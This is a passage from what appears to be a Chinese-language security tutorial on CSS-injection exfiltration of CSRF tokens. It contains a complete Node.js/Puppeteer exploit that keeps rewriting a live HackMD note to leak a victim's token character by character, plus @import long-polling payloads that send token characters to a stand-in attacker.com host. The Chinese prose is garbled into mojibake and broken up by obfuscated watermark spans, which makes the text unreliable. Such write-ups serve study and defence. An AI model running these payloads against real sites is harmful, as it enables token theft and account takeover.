<p>è€Œåœ¨ä»¥ä¸‹ç¤ºä¾‹ HackMD ä¸­ CSRF <span class="hexo-wm">ğ˜´â€Â³ğ¯ğ˜¦ğ˜¯âˆ™â€ğ˜´â…ˆâ€tğ˜¦â€‹â€Œ</span>token åœ¨é‡æ–°åŠ è½½åä¼šæ›´æ–°ï¼Œ<br>è€Œç¤ºä¾‹ HackMD æ”¯æŒ Style æ ·å¼çš„å®æ—¶æ›´æ–°ï¼Œ<br>ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦å†…å®¹å˜äº†ï¼Œä¼šç«‹åˆ»åæ˜ åœ¨å…¶ä»– client çš„ç”»é¢ä¸Šï¼Œ<br>å› æ­¤å¯ä»¥åšåˆ°ä¸é‡æ–°åŠ è½½è€Œå®æ—¶æ›´æ–°styleã€‚</p>
<h3 id="6-1-æ­¥éª¤"><a href="#6-1-æ­¥éª¤" class="headerlink" title="6.1 æ­¥éª¤"></a>6.1 æ­¥éª¤</h3><ol>
<li>å‡†å¤‡å¥½æ³„éœ²ç¬¬ä¸€ä¸ªå­—å…ƒçš„ CSS <span class="hexo-wm">ğ’”ï»¿â€Œâ‘¶ğ¯eğ§â€¢â€ğ’”ï½‰â€Œâ€Œğ˜µeï»¿â€Œ</span>Payloadï¼Œæ’å…¥åˆ° HackMD é‡Œ</li>
<li>å—å®³è€…æ‰“å¼€é¡µé¢</li>
<li>æœåŠ¡å™¨æ”¶åˆ°æ³„éœ²ç¬¬ä¸€ä¸ªå­—å…ƒçš„è¯·æ±‚</li>
<li>ä»æœåŠ¡å™¨æ›´æ–° HackMD <span class="hexo-wm">ğ¬ï»¿â€‹â‘¶ğ˜·ğ˜¦ğ˜¯âˆ™â€‹êœ±â…ˆâ€Œâ€‹ğ˜µeâ€Œâ€Œ</span>å†…å®¹ï¼Œæ¢æˆæ³„éœ²ç¬¬äºŒä¸ªå­—å…ƒçš„ Payload</li>
<li>å—å®³è€…é¡µé¢å³æ—¶æ›´æ–°ï¼Œ<span class="hexo-wm">sâ€â‘¶vâ„¯ï½â€¢â€‹â€‹ğ’”iï»¿ï»¿ğ˜µğ˜¦â€‹</span>è½½å…¥æ–°çš„ Style</li>
<li>æœåŠ¡å™¨æ”¶åˆ°ç¬¬äºŒ<span class="hexo-wm">êœ±ï»¿â€â‘¶ğ˜·ï½…ğ§â€¢â€ï»¿ğ¬ğ˜ªâ€‹ğ˜µğâ€Œï»¿</span>ä¸ªå­—å…ƒçš„è¯·æ±‚</li>
<li>ä¸æ–­å¾ªç¯ç›´åˆ°æ•´ä¸ª<span class="hexo-wm">ğ’”â€â€ğŸ¯ğ’—eğ˜¯â€¤ï»¿ï»¿ğ˜€ğ¢â€ğ’•â„®â€Œâ€</span>ç›®æ ‡ä¿¡æ¯è¢«æ³„éœ²</li>
</ol>
<p><img src="image-3.png" alt="image-3.png"></p>
<h3 id="6-2-Payload"><a href="#6-2-Payload" class="headerlink" title="6.2 Payload"></a>6.2 Payload</h3><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'puppeteer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=&gt;</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Create a hackMD document and let anyone can view/edit</span>
<span class="token keyword">const</span> noteUrl <span class="token operator">=</span> <span class="token string">'https://hackmd.io/1awd-Hg82fekACbL_ode3aasf'</span>
<span class="token keyword">const</span> host <span class="token operator">=</span> <span class="token string">'http://localhost:3000'</span>
<span class="token keyword">const</span> baseUrl <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">'/extract?q='</span>
<span class="token keyword">const</span> port <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">3000</span>

<span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token boolean">true</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setViewport</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">width</span><span class="token operator">:</span> <span class="token number">1280</span><span class="token punctuation">,</span> <span class="token literal-property property">height</span><span class="token operator">:</span> <span class="token number">800</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setRequestInterception</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  page<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token parameter">request</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> url <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment">// cancel request to self</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>baseUrl<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      request<span class="token punctuation">.</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      request<span class="token punctuation">.</span><span class="token function">continue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Listening at http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Waiting for server to get ready...'</span><span class="token punctuation">)</span>
    <span class="token function">startExploit</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> page<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">startExploit</span><span class="token punctuation">(</span><span class="token parameter">app<span class="token punctuation">,</span> page</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> currentToken <span class="token operator">=</span> <span class="token string">''</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>noteUrl <span class="token operator">+</span> <span class="token string">'?edit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">addStyleTag</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">"{scroll-behavior: auto !important;}"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> initialPayload <span class="token operator">=</span> <span class="token function">generateCss</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">await</span> <span class="token function">updateCssPayload</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> initialPayload<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Server is ready, you can open </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>noteUrl<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">?view on the browser</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>

  app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/extract'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> query <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>query<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">query: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>query<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">, progress: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>query<span class="token punctuation">.</span>length<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/36</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    currentToken <span class="token operator">=</span> query
    <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'over'</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token function">generateCss</span><span class="token punctuation">(</span>currentToken<span class="token punctuation">)</span>
    <span class="token function">updateCssPayload</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">updateCssPayload</span><span class="token punctuation">(</span><span class="token parameter">page<span class="token punctuation">,</span> payload</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">'.CodeMirror-line'</span><span class="token punctuation">)</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">down</span><span class="token punctuation">(</span><span class="token string">'Meta'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">press</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">up</span><span class="token punctuation">(</span><span class="token string">'Meta'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">press</span><span class="token punctuation">(</span><span class="token string">'Backspace'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>
  <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">sendCharacter</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Updated css payload, waiting for next request'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">generateCss</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> csrfTokenChars <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_'</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>prefix<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">
&lt;style&gt;
    head, meta {
        display: block;
    }
    </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>
      csrfTokenChars<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">char</span> <span class="token operator">=&gt;</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
        meta[name="csrf-token"][content^="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>prefix <span class="token operator">+</span> char<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"] {
            background: url(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>baseUrl<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>prefix <span class="token operator">+</span> char<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)
        }
      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    <span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">
&lt;/style&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span></code></pre>

<h2 id="7-import-é€’å½’å¯¼å…¥"><a href="#7-import-é€’å½’å¯¼å…¥" class="headerlink" title="7. @import é€’å½’å¯¼å…¥"></a>7. @import é€’å½’å¯¼å…¥</h2><p>å®Œæˆä¸Šè¿° CSS <span class="hexo-wm">ğ¬â€Â³â…´ğğ˜¯â€¢â€‹ğ’”ğ˜ªï»¿ï»¿ğ­ğ˜¦â€Œ</span>Injection é€šå¸¸éœ€è¦æ»¡è¶³ä»¥ä¸‹å…ˆå†³æ¡ä»¶ï¼š</p>
<ol>
<li>CSS æ³¨å…¥éœ€è¦å…è®¸è¶³å¤Ÿé•¿çš„æœ‰æ•ˆè´Ÿè½½</li>
<li>èƒ½å¤Ÿæ„å»ºé¡µé¢ä»¥è§¦å‘æ–°ç”Ÿæˆçš„æœ‰æ•ˆè´Ÿè½½çš„ <span class="hexo-wm">Ñ•ï»¿â€Â³ğ’—â„¯ğ§ï¼ï»¿ï»¿Ñ•iâ€ğ­ï½…ï»¿ï»¿</span>CSS é‡æ–°è¯„ä¼°</li>
<li>èƒ½å¤Ÿä½¿ç”¨å¤–éƒ¨æ‰˜ç®¡çš„å›¾åƒï¼ˆå¯èƒ½è¢« <span class="hexo-wm">ğ˜´ï»¿â€ŒÂ³â…´ï½…ğ˜¯â€¢â€â€Œğ¬â…ˆâ€‹ğ˜µğ˜¦â€â€</span>CSP é˜»æ­¢ï¼‰</li>
</ol>
<p>è¿™æ„å‘³ç€å¦‚æœæ³¨å…¥ä¸å…è®¸è¶³å¤Ÿå¤§å°çš„æœ‰æ•ˆè´Ÿè½½æˆ–è€…é¡µé¢æ— æ³•æ„å»ºï¼Œ<span class="hexo-wm">ğ˜´â€Œâ€ŒğŸ¯â…´eğ§ï¼â€Œğ˜€iï»¿tï½…â€â€Œ</span>åˆ™ä¸Šè¿°çš„æŠ€æœ¯å¯èƒ½ä¸é€‚ç”¨ã€‚</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹éœ€è¦ä¸€ç§è®©æµè§ˆå™¨æ— éœ€é‡æ–°åŠ è½½iframe æˆ–é¢å¤–çš„ç”¨æˆ·äº¤äº’ï¼Œ<span class="hexo-wm">ğ¬â€‹Â³ğ˜·enï¼â€‹ğ˜€ğ¢â€‹â€Œï½”ğ˜¦â€ï»¿</span>å³å¯é‡æ–°è¯„ä¼°å¤šä¸ª CSS æœ‰æ•ˆè´Ÿè½½ï¼Œè€Œä¸”è¿˜éœ€è¦èƒ½ç»•è¿‡å¯ä»¥æ³¨å…¥çš„æœ‰æ•ˆè´Ÿè½½çš„é•¿åº¦é™åˆ¶çš„æ–¹æ³•ã€‚</p>
<p>ä»…ä½¿ç”¨æ ‡ç­¾æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ä¼¼ä¹ä¸å¤ªå¯èƒ½ï¼Œ<span class="hexo-wm">ğ˜´ï»¿3ğ’—eğ’â€¢ï»¿ğ¬ï½‰â€Œâ€‹ï½”â„®â€Œ</span>å› æ­¤è€ƒè™‘æœ‰è¶£çš„CSSåŠŸèƒ½ï¼š<code>@import</code></p>
<h3 id="7-1-import-ç”¨æ³•"><a href="#7-1-import-ç”¨æ³•" class="headerlink" title="7.1 @import ç”¨æ³•"></a>7.1 @import ç”¨æ³•</h3><p>è®¸å¤šç¼–ç¨‹è¯­è¨€éƒ½èƒ½å¤Ÿä»å…¶ä»–æºæ–‡ä»¶å¯¼å…¥ä»£ç ï¼ŒCSS ä¹Ÿä¸ä¾‹å¤–ã€‚<br>è™½ç„¶è®¸å¤šäººå¯èƒ½åªçŸ¥é“ <code>&lt;link href="..." rel="stylesheet"&gt;</code> ï¼Œ<br>ä½† CSS æœ¬èº«å®é™…ä¸Šæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥ä½¿ç”¨åä¸º <code>@import</code> çš„è§„åˆ™ï¼Œ<br>æ‰§è¡Œç±»ä¼¼ <code>&lt;link&gt;</code>ï¼ˆä½†ä¸åŒï¼‰ç±»å‹çš„<span class="hexo-wm">ğ˜´â€Â³ğ’—eğ§ï¼â€‹â€ğ˜´â…ˆâ€Œtğï»¿</span>æ ·å¼è¡¨åŒ…å«ã€‚</p>
<h3 id="7-2-é€’å½’å¯¼å…¥çš„å…ˆå†³æ¡ä»¶"><a href="#7-2-é€’å½’å¯¼å…¥çš„å…ˆå†³æ¡ä»¶" class="headerlink" title="7.2 é€’å½’å¯¼å…¥çš„å…ˆå†³æ¡ä»¶"></a>7.2 é€’å½’å¯¼å…¥çš„å…ˆå†³æ¡ä»¶</h3><p>è¦å®Œæˆä½¿ç”¨ @import çš„é€’å½’å¯¼å…¥ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹å…ˆå†³æ¡ä»¶ï¼š</p>
<ol>
<li>åœ¨æ ·å¼æ ‡è®°çš„å¼€å¤´æ‹¥æœ‰æ§åˆ¶æƒï¼ˆHTML <span class="hexo-wm">ğ¬ï»¿â€‹â‘¶ğ’—â„¯ğ§âˆ™ï»¿ğ˜´ï½‰â€‹â€ğ’•ğâ€</span>æ³¨å…¥é€šå¸¸æ‹¥æœ‰æ­¤æ§åˆ¶æƒï¼‰</li>
<li>é¡µé¢ CSP <span class="hexo-wm">ğ¬â€â‘¶ğ˜·eï½Â·â€Œâ€ğ˜€iï»¿ï½”â„®ï»¿â€</span>æ²¡æœ‰é˜»æ­¢å¤–éƒ¨ <code>style-src</code> url çš„ä½¿ç”¨</li>
</ol>
<h3 id="7-3-é€’å½’å¯¼å…¥åŸç†"><a href="#7-3-é€’å½’å¯¼å…¥åŸç†" class="headerlink" title="7.3 é€’å½’å¯¼å…¥åŸç†"></a>7.3 é€’å½’å¯¼å…¥åŸç†</h3><p>æˆ‘ä»¬éœ€è¦æµè§ˆå™¨è¯„ä¼°ä¸€æ¬¡æ¶æ„ cssï¼Œä½¿ç”¨ä¸‹ä¸€ä¸ªè·å¾—åˆ°çš„<code>token</code>å‘é€å‡ºç«™è¯·æ±‚ï¼Œç„¶åé‡å¤ã€‚<br>æ˜¾ç„¶ï¼Œâ€œé‡å¤â€éƒ¨åˆ†é€šå¸¸æ˜¯ä½¿ç”¨å…¨å¸§é‡æ–°åŠ è½½ï¼ˆiframeï¼Œæˆ–é€‰é¡¹å¡ç­‰ç­‰ï¼‰æ¥å®Œæˆçš„ã€‚<br>ç„¶è€Œï¼Œæˆ‘ä»¬å®é™…ä¸Šå¹¶ä¸éœ€è¦é‡æ–°åŠ <span class="hexo-wm">ğ˜´â€â‘¶ğ˜·enâˆ™â€‹ğ˜´ğ¢â€Œâ€‹ğ˜µï½…â€â€‹</span>è½½æ¡†æ¶æ¥è®©æµè§ˆå™¨é‡æ–°è¯„ä¼°æ–°çš„CSSã€‚</p>
<p>@import é€’å½’å¯¼å…¥ <span class="hexo-wm">sâ€Â³ğ¯ğğ˜¯ï¼ï»¿ğ˜€ï½‰â€‹ï»¿ğ’•ï½…â€‹</span>ä½¿ç”¨ 3 ä¸ªç®€å•æ­¥éª¤æ¥æ¬ºéª—æŸäº›æµè§ˆå™¨æ‰§è¡Œå¤šæ¬¡è¯„ä¼°ï¼š</p>
<ol>
<li>å°† <code>@import</code> è§„åˆ™æ³¨å…¥æš‚å­˜è´Ÿè½½</li>
<li>æš‚å­˜æœ‰æ•ˆè´Ÿè½½ç”¨äº <code>@import</code> å¼€å§‹å¯¹æ¶æ„æœ‰æ•ˆ<span class="hexo-wm">ğ’”â€ï»¿ğŸ¯vğ˜¦ï½.â€Œï»¿ğ¬ğ¢â€â€‹tğï»¿ï»¿</span>è´Ÿè½½è¿›è¡Œé•¿è½®è¯¢</li>
<li>æœ‰æ•ˆè´Ÿè½½å¯¼è‡´æµè§ˆå™¨è°ƒç”¨ <code>usingbackground-img: url(...)</code> å¯¼è‡´ç”Ÿæˆä¸‹ä¸€ä¸ªé•¿è½®è¯¢ <code>@import</code> è§„åˆ™å¹¶å°†å…¶è¿”<span class="hexo-wm">êœ±ï»¿3ğ˜·ğğ˜¯âˆ™â€Œâ€ğ¬ğ¢â€‹â€‹ğ˜µğâ€Œâ€Œ</span>å›ç»™æµè§ˆå™¨ã€‚</li>
</ol>
<p><img src="image-4.png" alt="image-4.png"></p>
<h3 id="7-4-é€’å½’å¯¼å…¥ç¤ºä¾‹"><a href="#7-4-é€’å½’å¯¼å…¥ç¤ºä¾‹" class="headerlink" title="7.4 é€’å½’å¯¼å…¥ç¤ºä¾‹"></a>7.4 é€’å½’å¯¼å…¥ç¤ºä¾‹</h3><p>å‡è®¾ <code>token</code> é•¿åº¦ä¸º 32 ä¸ªå­—ç¬¦</p>
<h4 id="7-4-1-æœ‰æ•ˆè½½è·ç¤ºä¾‹"><a href="#7-4-1-æœ‰æ•ˆè½½è·ç¤ºä¾‹" class="headerlink" title="7.4.1 æœ‰æ•ˆè½½è·ç¤ºä¾‹"></a>7.4.1 æœ‰æ•ˆè½½è·ç¤ºä¾‹</h4><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token atrule"><span class="token rule">@import</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/staging?len=32<span class="token punctuation">)</span></span><span class="token punctuation">;</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span></code></pre>
<h4 id="7-4-2-æ­¥éª¤ç¤ºä¾‹"><a href="#7-4-2-æ­¥éª¤ç¤ºä¾‹" class="headerlink" title="7.4.2 æ­¥éª¤ç¤ºä¾‹"></a>7.4.2 æ­¥éª¤ç¤ºä¾‹</h4><pre class="language-markup" data-language="markup"><code class="language-markup">@import url(http://attacker.com/lp?len=0);
@import url(http://attacker.com/lp?len=1);
@import url(http://attacker.com/lp?len=2);
...
@import url(http://attacker.com/lp?len=31);</code></pre>
<h4 id="7-4-3-é•¿è½®è¯¢æœ‰æ•ˆè´Ÿè½½ï¼ˆç¬¬0ä½ï¼‰ç¤ºä¾‹"><a href="#7-4-3-é•¿è½®è¯¢æœ‰æ•ˆè´Ÿè½½ï¼ˆç¬¬0ä½ï¼‰ç¤ºä¾‹" class="headerlink" title="7.4.3 é•¿è½®è¯¢æœ‰æ•ˆè´Ÿè½½ï¼ˆç¬¬0ä½ï¼‰ç¤ºä¾‹"></a>7.4.3 é•¿è½®è¯¢æœ‰æ•ˆè´Ÿè½½ï¼ˆç¬¬0ä½ï¼‰ç¤ºä¾‹</h4><pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[name=xsrf][value^=a]</span> <span class="token punctuation">{</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token selector">input[name=xsrf][value^=b]</span> <span class="token punctuation">{</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token selector">input[name=xsrf][value^=c]</span> <span class="token punctuation">{</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=c<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token selector">...
input[name=xsrf][value^=Z]</span> <span class="token punctuation">{</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=Z<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre>
<p>æµè§ˆå™¨è°ƒç”¨<code>http://attacker.com/exfil?t=&lt;first char of token&gt;</code>åï¼Œ<br><code>attacker.com</code> è®°å½• <code>token</code> ï¼Œ<br>ç”Ÿæˆä¸‹ä¸€ä¸ªé•¿è½®<span class="hexo-wm">Ñ•â€‹ï»¿â‘¶ğ¯ğ˜¦ğ’â€¤ï»¿â€ğ˜€ğ˜ªâ€Œğ˜µeâ€Œï»¿</span>è¯¢è´Ÿè½½ï¼Œå¹¶è¿”å›<code>http://attacaker.com/lp?len=1</code>çš„å“åº”ã€‚</p>
<h4 id="7-4-4-é•¿è½®è¯¢æœ‰æ•ˆè´Ÿè½½ï¼ˆç¬¬-1-s-ä½ï¼‰ç¤ºä¾‹"><a href="#7-4-4-é•¿è½®è¯¢æœ‰æ•ˆè´Ÿè½½ï¼ˆç¬¬-1-s-ä½ï¼‰ç¤ºä¾‹" class="headerlink" title="7.4.4 é•¿è½®è¯¢æœ‰æ•ˆè´Ÿè½½ï¼ˆç¬¬ 1-s ä½ï¼‰ç¤ºä¾‹"></a>7.4.4 é•¿è½®è¯¢æœ‰æ•ˆè´Ÿè½½ï¼ˆç¬¬ 1-s ä½ï¼‰ç¤ºä¾‹</h4><blockquote>
<p>åœ¨å½“å‰çŠ¶æ€ä¸‹ <span class="hexo-wm">sâ€â‘¶ğ˜·ï½…ğ˜¯.â€‹â€Œğ¬â…ˆâ€Œâ€Œtğ˜¦â€‹</span>ç¬¬ 0-s-<span class="hexo-wm">ğ¬ï»¿ï»¿ğŸ¯ğ˜·ğ˜¦ğ§âˆ™â€‹â€Ñ•iâ€‹â€‹ğ­â„®â€</span>1 ä¸ªå­—ç¬¦ å·²çŸ¥</p>
</blockquote>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">input[name=xsrf][value^=sa]</span> <span class="token punctuation">{</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sa<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token selector">input[name=xsrf][value^=sb]</span> <span class="token punctuation">{</span> <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>http://attacker.com/exfil?t=sb<span class="token punctuation">)</span></span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
